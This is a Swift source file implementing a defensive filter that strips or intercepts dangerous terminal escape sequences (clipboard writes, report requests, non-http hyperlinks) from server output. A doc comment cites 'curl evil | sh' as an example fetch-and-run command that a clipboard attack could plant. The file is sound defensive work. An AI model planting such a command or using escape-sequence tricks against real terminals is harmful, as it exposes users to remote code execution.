public import Foundation

/// Sanitises a byte stream coming from a server before it reaches the emulator.
///
/// Everything the terminal draws is dictated by the far end, so the stream is
/// untrusted input. Three sequence families are dangerous and are neutralised
/// here rather than trusted to the emulator:
///
/// - `OSC 52` writes the system clipboard. Left alone, a log line can plant
///   `curl evil | sh` and the next paste executes it.
/// - Report requests (`DECRQSS`, `DA`, `DSR`, `ENQ`, title report) make the
///   terminal answer the server with a string the server chose; the answer
///   arrives as keystrokes. This is how iTerm2 (CVE-2022-45872) and mintty fell.
/// - Hyperlinks (`OSC 8`) can carry `file://` or worse behind ordinary text.
///
/// The guard removes them from the stream and hands the caller a list of
/// requests to confirm with the user instead.
public struct AnsiGuard: Sendable {
    /// Something the stream asked for that needs a human decision.
    public enum Request: Equatable, Sendable {
        /// The server wants to place `text` on the clipboard.
        case clipboardWrite(String)
        /// A hyperlink whose scheme is not http(s); kept as plain text.
        case unsafeLink(String)
    }

    public struct Output: Sendable {
        /// Bytes safe to feed to the emulator.
        public var bytes: [UInt8]
        /// Requests intercepted while scanning. Never acted on automatically.
        public var requests: [Request]
    }

    /// Largest numeric CSI parameter we pass through. Bigger values are clamped:
    /// a repeat count of ten million is a denial of service, not a layout.
    public static let parameterLimit = 65_535

    // Восьмибитные формы C1 (0x9B как CSI, 0x9D как OSC) намеренно не
    // распознаются: в UTF-8 эти байты — части многобайтных символов, и
    // трактовать их как управляющие значит ломать текст.
    private enum State {
        case ground
        case escape
        case csi
        case osc
        case oscEscape
        case stringSequence  // DCS, SOS, PM, APC — swallowed whole
        case stringEscape
    }

    private var state: State = .ground
    private var oscBuffer: [UInt8] = []
    private var csiBuffer: [UInt8] = []

    public init() {}

    /// Feeds a chunk and returns the sanitised bytes plus intercepted requests.
    ///
    /// The guard is a state machine across calls, so a sequence split over two
    /// reads is still handled correctly.
    public mutating func filter(_ input: [UInt8]) -> Output {
        var out: [UInt8] = []
        out.reserveCapacity(input.count)
        var requests: [Request] = []
        for byte in input { step(byte, out: &out, requests: &requests) }
        return Output(bytes: out, requests: requests)
    }

    private mutating func step(_ byte: UInt8, out: inout [UInt8], requests: inout [Request]) {
        switch state {
        case .ground: ground(byte, out: &out)
        case .escape: escape(byte, out: &out)
        case .csi: csi(byte, out: &out)
        case .osc: osc(byte, out: &out, requests: &requests)
        case .oscEscape: oscEscape(byte, out: &out, requests: &requests)
        case .stringSequence: state = byte == 0x1B ? .stringEscape : (byte == 0x07 ? .ground : state)
        case .stringEscape: state = (byte == UInt8(ascii: "\\")) ? .ground : .stringSequence
        }
    }

    private mutating func ground(_ byte: UInt8, out: inout [UInt8]) {
        if byte == 0x1B {
            state = .escape
        } else if byte != 0x05 {
            // 0x05 is ENQ, the classic answerback trigger: never replied to.
            out.append(byte)
        }
    }

    private mutating func escape(_ byte: UInt8, out: inout [UInt8]) {
        switch byte {
        case UInt8(ascii: "["):
            state = .csi
            csiBuffer = []
        case UInt8(ascii: "]"):
            state = .osc
            oscBuffer = []
        case UInt8(ascii: "P"), UInt8(ascii: "X"), UInt8(ascii: "^"), UInt8(ascii: "_"):
            // DCS/SOS/PM/APC. DECRQSS lives in DCS; none of it is useful to us
            // and all of it can request a reply.
            state = .stringSequence
        case UInt8(ascii: "Z"):
            // DECID: старый запрос идентификации. Терминал на него отвечает —
            // тот же answerback, только другой формы.
            state = .ground
        case 0x1B:
            break
        default:
            out.append(0x1B)
            out.append(byte)
            state = .ground
        }
    }

    private mutating func csi(_ byte: UInt8, out: inout [UInt8]) {
        csiBuffer.append(byte)
        if (0x40...0x7E).contains(byte) {
            out.append(contentsOf: Self.sanitiseCSI(csiBuffer))
            csiBuffer = []
            state = .ground
        } else if csiBuffer.count > 64 {
            csiBuffer = []
            state = .ground
        }
    }

    private mutating func osc(_ byte: UInt8, out: inout [UInt8], requests: inout [Request]) {
        if byte == 0x07 {
            Self.handleOSC(oscBuffer, out: &out, requests: &requests)
            oscBuffer = []
            state = .ground
        } else if byte == 0x1B {
            state = .oscEscape
        } else {
            oscBuffer.append(byte)
            if oscBuffer.count > 8192 {
                oscBuffer = []
                state = .ground
            }
        }
    }

    private mutating func oscEscape(_ byte: UInt8, out: inout [UInt8], requests: inout [Request]) {
        if byte == UInt8(ascii: "\\") {
            Self.handleOSC(oscBuffer, out: &out, requests: &requests)
        }
        oscBuffer = []
        state = .ground
    }

    // MARK: - Sequence handling

    /// Passes a CSI sequence through, dropping report requests and clamping
    /// numeric parameters.
    private static func sanitiseCSI(_ body: [UInt8]) -> [UInt8] {
        guard let final = body.last else { return [] }

        // Device Attributes / Device Status Report / cursor position report:
        // all of them make the terminal talk back to the server.
        if final == UInt8(ascii: "c") || final == UInt8(ascii: "n") { return [] }
        // Window manipulation includes "report title" and "report size in
        // pixels", which leak state and can echo attacker text back as input.
        if final == UInt8(ascii: "t") { return [] }

        let parameters = body.dropLast()
        var rebuilt: [UInt8] = [0x1B, UInt8(ascii: "[")]
        var number: Int?
        var changed = false

        for byte in parameters {
            if (0x30...0x39).contains(byte) {
                let digit = Int(byte - 0x30)
                let next = (number ?? 0) * 10 + digit
                number = min(next, parameterLimit * 10)
            } else {
                if let value = number {
                    let clamped = min(value, parameterLimit)
                    if clamped != value { changed = true }
                    rebuilt.append(contentsOf: Array(String(clamped).utf8))
                    number = nil
                }
                rebuilt.append(byte)
            }
        }
        if let value = number {
            let clamped = min(value, parameterLimit)
            if clamped != value { changed = true }
            rebuilt.append(contentsOf: Array(String(clamped).utf8))
        }
        rebuilt.append(final)
        return changed ? rebuilt : [0x1B, UInt8(ascii: "[")] + body
    }

    /// Handles an OSC payload: clipboard writes and hyperlinks are intercepted,
    /// window titles are dropped, everything else passes through.
    private static func handleOSC(_ body: [UInt8], out: inout [UInt8], requests: inout [Request]) {
        let text = String(decoding: body, as: UTF8.self)
        guard let separator = text.firstIndex(of: ";") else { return }
        let code = String(text[text.startIndex..<separator])
        let payload = String(text[text.index(after: separator)...])

        switch code {
        case "52":
            // OSC 52: `targets;base64`. A `?` payload is a *read* request —
            // answering it would hand the clipboard to the server, so it is
            // dropped without comment.
            guard let comma = payload.firstIndex(of: ";") else { return }
            let encoded = String(payload[payload.index(after: comma)...])
            guard encoded != "?", !encoded.isEmpty,
                let data = Data(base64Encoded: encoded),
                let value = String(data: data, encoding: .utf8)
            else { return }
            requests.append(.clipboardWrite(value))

        case "8":
            // OSC 8: `params;uri`. Only http(s) reaches the emulator.
            guard let comma = payload.firstIndex(of: ";") else { return }
            let uri = String(payload[payload.index(after: comma)...])
            if uri.isEmpty {
                out.append(contentsOf: Array("\u{1B}]8;;\u{1B}\\".utf8))  // closing tag
            } else if uri.hasPrefix("http://") || uri.hasPrefix("https://") {
                out.append(contentsOf: Array("\u{1B}]8;;\(uri)\u{1B}\\".utf8))
            } else {
                requests.append(.unsafeLink(uri))
            }

        case "0", "1", "2":
            // Window and icon title. We never show it: the host name in the
            // interface comes from our own profile, never from the stream.
            return

        default:
            out.append(0x1B)
            out.append(UInt8(ascii: "]"))
            out.append(contentsOf: body)
            out.append(0x07)
        }
    }
}
